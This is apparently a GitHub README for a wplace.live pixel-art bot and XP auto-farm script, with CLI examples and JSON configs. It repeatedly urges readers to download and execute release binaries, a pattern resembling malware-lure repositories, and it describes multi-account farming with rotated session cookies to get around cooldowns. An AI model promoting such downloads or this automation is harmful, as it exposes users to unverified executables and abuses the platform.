[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Alexxxx4/WPlace-AutoBOT/releases)

# WPlace AutoBOT — Auto Pixel Art & Auto-Farm Scripts

🛠️┃WPlace AutoBOT — Scripts to create pixel art on wplace.live and an auto-farm script to level up.

Tags: autobot, automation, bot, pixel-art, pixelart, word-place, wordplace, wplace, wplace-auto, wplace-auto-art, wplace-auto-image, wplace-autobot, wplace-automation, wplace-bot, wplace-hack, wplace-hacking, wplace-image, wplace-pixelart, wplace-script, wplace-scripts

Overview
- This repository collects scripts and helpers to automate actions on wplace.live.
- It includes a pixel art automation tool that paints images on the word-place canvas.
- It also includes an auto-farm script designed to help an account gain experience and levels.
- Use the Releases page to download the packaged scripts and run them on your machine: https://github.com/Alexxxx4/WPlace-AutoBOT/releases (download the release file and execute it).

Screenshots and preview
- Pixel art render (example):
  ![Pixel art example from public domain](https://upload.wikimedia.org/wikipedia/commons/2/24/Pixel_art_sample.png)
- Bot control panel mockup:
  ![Bot control panel](https://raw.githubusercontent.com/github/explore/main/topics/bot/bot.png)

Table of contents
- Features
- What’s included
- Requirements
- Installation (download and run from Releases)
- Quick start
- Pixel art automation (workflow and examples)
- Auto-farm script (design and usage)
- Configuration file reference
- Command line options
- Image preprocessing and mapping
- Performance tips
- Safety and account handling
- Troubleshooting
- Advanced topics
- Development notes
- Contributing
- License
- Credits
- Changelog
- FAQ

Features
- Scripted pixel placement across the wplace.live canvas.
- Support for PNG and GIF inputs.
- Automatic color mapping to the site palette.
- Collision handling to avoid overwriting locked areas.
- Rate control and timing to respect server interactions.
- Auto-farm bot that performs in-game tasks for XP gain.
- Headless and GUI modes.
- Command line interface and config file support.
- Logging with multiple levels.
- Modular code for easy extension.

What’s included
- pixelbot.py — Main pixel art automation script.
- autofarm.py — Auto-farm logic and scheduler.
- preprocess/ — Image processing tools and palette mappers.
- configs/ — Sample config files for common setups.
- scripts/ — Helper scripts for runs, installs, and demos.
- docs/ — Additional usage documents and mapping guides.
- LICENSE — License file.

Requirements
- Python 3.10+ (for the Python scripts).
- Node.js 16+ (optional; some tools use Node for packaging).
- pip or poetry for dependency install.
- A valid wplace.live account and session cookie (cookie handling is required by the bot).
- Basic command line knowledge.

Installation

1) Download the release
- Visit the Releases page and download the appropriate release artifact for your platform:
  https://github.com/Alexxxx4/WPlace-AutoBOT/releases
- The release includes packaged scripts and any required binary helpers.
- After download, place the file in a working folder.

2) Extract and prepare
- For zip or tar archives:
  - unzip or tar xvf archive.
- For single script bundles:
  - make the script executable (chmod +x myscript) on Unix systems.
- The release contains a README and sample configs in the top-level folder.

3) Install dependencies
- Python
  - Create a virtual environment.
    - python -m venv venv
    - On Windows: venv\Scripts\activate
    - On Unix: source venv/bin/activate
  - Install dependencies:
    - pip install -r requirements.txt
- Node (optional)
  - npm install

4) Execute the packaged file
- The release file requires execution.
- Run the provided launcher, for example:
  - python pixelbot.py --config configs/default.json
- Or use the packaged binary if the release provides one:
  - ./WPlace-AutoBOT-linux-amd64
- The release page lists the name of the artifact you must run. Follow the included launcher or the scripts folder.

Quick start

Pixel art bot (basic run)
- Example: paint a PNG onto the canvas
  - python pixelbot.py --image assets/logo.png --config configs/default.json
- The bot will:
  - load the image,
  - map colors to the site palette,
  - schedule placements,
  - place pixels until the image finishes.

Auto-farm bot (basic run)
- Example: start the farm routine
  - python autofarm.py --config configs/farm.json
- The bot will:
  - login with session data,
  - perform selected actions on a loop,
  - manage timeouts and cooldowns,
  - log progress.

Pixel art automation — design and workflow

Overview
- The pixel bot converts an input image into placement commands.
- It reads a palette that matches wplace.live.
- It optimizes placement order to reduce network load.
- It handles collisions and locked coordinates.

Workflow steps
1. Load image
- The script accepts PNG and GIF.
- For GIFs, the script reads frames and treats each frame as a layer.

2. Resize and map
- The tool resizes the image to fit the canvas or a target area.
- The script applies nearest-neighbor scaling by default to keep pixel edges sharp.

3. Palette quantization
- The bot maps image colors to the site palette.
- Use the provided palette file or a custom JSON palette.

4. Optimize placement
- The bot groups pixels by color to reduce color switches.
- The bot orders pixels to reduce travel time and maximize success.

5. Place pixels
- The bot sends placement requests to the site API or through the web socket as the site requires.
- The bot respects per-account cooldowns and timing.

6. Verify and retry
- After placement, the bot checks if the pixel matches the desired color.
- The bot re-queues failed placements.

Image input options
- --image <file> : local image file (PNG/GIF).
- --url <url> : remote image. The script downloads the file and processes it.
- --crop x y w h : crop region of the image before processing.
- --scale n : scale factor or target width.

Color mapping and palette
- The project includes a default palette file tuned for wplace.live.
- You can customize the palette in configs/palette.json.
- The mapping uses a simple nearest-color algorithm (euclidean RGB).
- The script supports dithering off or on (Floyd-Steinberg).

Auto-farm script — design and usage

Purpose
- The auto-farm script automates small actions to gain XP on the platform.
- It schedules and repeats safe, repeatable actions that yield progress.

Core components
- Action scheduler — schedules tasks with cool-down awareness.
- Session handler — reads cookie/session and maintains auth.
- Task modules — discrete tasks such as "complete quest", "visit page", "use item".
- Logger — logs XP, level, and actions.

Usage
- Start the farm:
  - python autofarm.py --config configs/farm.json
- Configure tasks in the config file. Each task defines:
  - name
  - endpoint
  - payload
  - interval
  - retries

Example farm.json
{
  "session_cookie": "SESSION=xxxx",
  "tasks": [
    {
      "name": "daily-checkin",
      "endpoint": "/api/checkin",
      "interval": 86400,
      "retries": 2
    },
    {
      "name": "xp-task",
      "endpoint": "/api/perform",
      "payload": {"action":"xp"},
      "interval": 600,
      "retries": 3
    }
  ],
  "logging": {
    "level": "INFO",
    "file": "logs/farm.log"
  }
}

Scheduling and cooldowns
- The bot reads server responses to learn cooldown windows.
- It stores those windows in runtime state.
- The scheduler avoids sending a request if cooldown still applies.

Configuration file reference

Top-level fields (JSON)
- session_cookie — string: authentication cookie or token.
- user_agent — string: send a custom user agent.
- canvas_area — object: defines target area (x, y, width, height).
- palette — string: path to palette JSON.
- rate_limit — object:
  - placements_per_minute — int
  - concurrent_requests — int
- logging — object:
  - level — DEBUG|INFO|WARN|ERROR
  - file — path
- tasks — array: for autofarm tasks.
- image_options — object:
  - scale — int
  - dithering — true|false
  - crop — [x,y,w,h]

Example default.json
{
  "session_cookie": "",
  "user_agent": "WPlace-AutoBOT/1.0",
  "canvas_area": {"x":0,"y":0,"width":1000,"height":1000},
  "palette": "configs/palette.json",
  "rate_limit": {"placements_per_minute": 60, "concurrent_requests": 2},
  "logging": {"level":"INFO","file":"logs/app.log"},
  "image_options": {"scale":1,"dithering":false}
}

Command line options

Common commands
- python pixelbot.py --help
- python pixelbot.py --image assets/pic.png --config configs/default.json
- python autofarm.py --config configs/farm.json --dry-run

Flags and usage
- --image <path> : input image
- --url <url> : input image url
- --config <path> : JSON config path
- --start-x <n> --start-y <n> : top-left coordinate for placement
- --threads <n> : concurrent placement threads
- --dry-run : do not send placement requests, just simulate
- --verbose : increase log verbosity
- --headless : run without opening a browser GUI

Examples

Paint an image on coordinates (10, 20)
- python pixelbot.py --image art.png --config configs/default.json --start-x 10 --start-y 20

Simulate a run
- python pixelbot.py --image test.png --config configs/default.json --dry-run

Run the auto-farm with verbose logging
- python autofarm.py --config configs/farm.json --verbose

Image preprocessing and mapping

Why preprocess
- The bot expects clean, indexed images.
- Preprocessing reduces color errors.
- Preprocessing can crop animation frames.

Steps
1. Convert to RGBA.
2. Trim empty borders if requested.
3. Resize to target width or scale factor with nearest-neighbor.
4. Quantize to palette.
5. Optionally dither.

Tools
- The repo includes a preprocess script:
  - python preprocess/convert.py --input in.png --output out.png --palette configs/palette.json
- The script exports a mapping file with coordinates and color indices.

GIF and animation support
- The bot can process animated GIFs.
- Each frame maps to a layer that the bot can render in sequence.
- Use the frame-delay field to control how long between frames.

Performance tips

Network
- Use low concurrent_requests if you hit rate limits.
- Use retry counts to handle transient failures.
- Reuse sessions to avoid re-authenticating repeatedly.

CPU
- Preprocess images once and cache the result.
- Use simpler dithering modes for large images.

Memory
- Stream very large images instead of loading all frames in memory.
- Use 32-bit color arrays and keep buffers small.

Scaling
- For very large canvases, split work into tiles.
- Process tiles in a queue and run multiple processes if you have multiple accounts.

Safety and account handling

Session handling
- Store session cookies in configs/session.json.
- The scripts read session data on start.
- Rotate session cookies for multi-account runs.

Rate limits
- Configure rate_limit to match observed server responses.
- The bot tracks server cooldowns and respects them.

Account mapping
- Use separate config files for each account.
- Use per-account logs.

Ethics and responsible use
- Use the bot for permitted activities and personal learning.
- Use a test account for trials.
- Respect community rules and terms of service.

Troubleshooting

Common issues and fixes

1) Image looks wrong after placement
- Check palette mapping. Use the provided palette file or adjust palette.json.
- Verify you set canvas_area and start coordinates.

2) Bot reports auth error
- Re-check session_cookie in the config.
- Ensure the cookie is current.
- Use the included session extractor tool if needed.

3) Too many rate limit errors
- Reduce placements_per_minute.
- Increase interval between requests.
- Use dry-run to test scheduling.

4) Pixel placement fails intermittently
- Check network stability.
- Increase retries.
- Use logging to capture server responses.

5) GIF frames do not animate as expected
- Confirm the frame-delay is set.
- Ensure the target area has room for full animation.

Advanced topics

Custom palette creation
- Use the palette editor in preprocess/tools to extract colors from a reference image.
- Save the palette as JSON with color name and RGB values.

Multi-account tiling
- Assign each account a tile region.
- Use a central coordinator script to allocate tile jobs.
- The coordinator monitors progress and redistributes work when an account hits cooldown.

Plugin system
- The bot supports plugin modules in the plugins/ folder.
- Plugins can add tasks, parsers, or custom mapping functions.

Web UI mode
- The repo includes a minimal web UI for monitoring.
- Start the UI with:
  - npm run ui
- The UI shows active tasks, logs, and progress.

Testing and CI
- Unit tests use pytest.
- Run tests:
  - pytest tests/

Development notes

Code layout
- src/ — core modules
- preprocess/ — image and palette tools
- configs/ — sample configs and palettes
- scripts/ — helper scripts
- tests/ — unit and integration tests

Style and conventions
- Use type hints for public functions.
- Keep functions small and focused.
- Document public functions with short docstrings.

Logging
- Use the logging module.
- Log at INFO for standard runs.
- Use DEBUG for development.

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Run unit tests.
- Open a pull request with a clear description of the change and tests.

Issue reporting
- Provide steps to reproduce.
- Attach logs and configs.
- Include platform and Python version.

Coding guidelines
- Follow PEP8.
- Write small commits with clear messages.
- Add tests for bug fixes and features.

Release process
- Tag releases with semantic versioning.
- Attach release artifacts to the Releases page.
- Update CHANGELOG.md for each release.

License
- This project uses the MIT license. See LICENSE for details.

Credits
- Core author and maintainer: Alexxxx4 (GitHub user).
- Image processing ideas adapted from public libraries.
- Community contributors listed in CONTRIBUTORS.md.

Changelog (high level)
- v1.0.0 — Initial release with pixel art bot and auto-farm script.
- v1.1.0 — Added GIF support and palette editor.
- v1.2.0 — Improved scheduler and logging.
- v1.3.0 — Web UI and plugin hooks.

Releases and downloads
- Visit the Releases page for packaged artifacts and installers:
  - https://github.com/Alexxxx4/WPlace-AutoBOT/releases
- Download the file for your platform and execute the included script or binary. The release bundle contains a launcher and a short README. Follow the launcher commands.

FAQ

Q: What image formats work?
A: PNG and GIF. The scripts accept remote URLs too.

Q: Can I run multiple bots at once?
A: Yes. Use separate config files and session cookies. Assign disjoint canvas tiles.

Q: Do I need a GUI?
A: No. The scripts run headless. Use --headless to avoid opening a browser.

Q: How do I change the palette?
A: Edit configs/palette.json or use the palette editor in preprocess/tools.

Q: Does the bot handle conflicts?
A: The bot checks server responses and retries failed placements. It uses an ordered queue to manage conflicts.

Q: Where do logs go?
A: Logs write to the path in the config logging.file. The app also prints to stdout.

Q: How do I extend the bot?
A: Add a plugin module in plugins/. Use the plugin template and register the plugin in plugins/__init__.py.

Q: Where do I find releases?
A: The Releases page hosts packaged builds and installers. Download the artifact and execute it: https://github.com/Alexxxx4/WPlace-AutoBOT/releases

Appendix: sample config templates

configs/pixel_default.json
{
  "session_cookie": "",
  "user_agent": "WPlace-AutoBOT/1.0",
  "canvas_area": {"x":0,"y":0,"width":1200,"height":600},
  "palette": "configs/palette.json",
  "rate_limit": {"placements_per_minute": 30, "concurrent_requests": 1},
  "logging": {"level":"INFO","file":"logs/pixelbot.log"},
  "image_options": {"scale":1,"dithering":false}
}

configs/farm.json
{
  "session_cookie": "",
  "user_agent": "WPlace-AutoBOT/1.0",
  "logging": {"level":"INFO","file":"logs/farm.log"},
  "tasks": [
    {"name":"xp","endpoint":"/api/xp","interval":300,"retries":3},
    {"name":"collect","endpoint":"/api/collect","interval":600,"retries":2}
  ]
}

Useful links and resources
- Releases and downloads: https://github.com/Alexxxx4/WPlace-AutoBOT/releases
- Palette guide: docs/palette.md
- Image preprocessing guide: docs/preprocess.md
- Plugin guide: docs/plugins.md
- Community forum: https://discord.gg/example (link placeholder)

Contact and support
- Open issues on GitHub.
- Submit pull requests for fixes and features.
- Include logs and configs when you report a problem.

Legal
- Follow the platform terms of service when you use automation tools.
- Use test accounts for development and experiments.

End of README sections

